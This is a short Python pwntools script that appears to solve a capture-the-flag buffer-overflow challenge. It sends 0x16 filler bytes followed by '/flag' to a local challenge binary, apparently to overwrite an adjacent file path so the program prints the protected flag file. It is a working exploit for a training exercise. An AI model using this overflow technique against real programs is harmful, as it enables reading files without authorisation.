#!/usr/bin/python3

import pwn

proc = pwn.process("/challenge/buffer-overflow-level1.2")
payload = b'a' * 0x16   # 写满缓冲区
payload += b'/flag'
print(payload)
proc.sendline(payload)

result = proc.recvall().decode()
for line in result.split('\n'):
    print(line)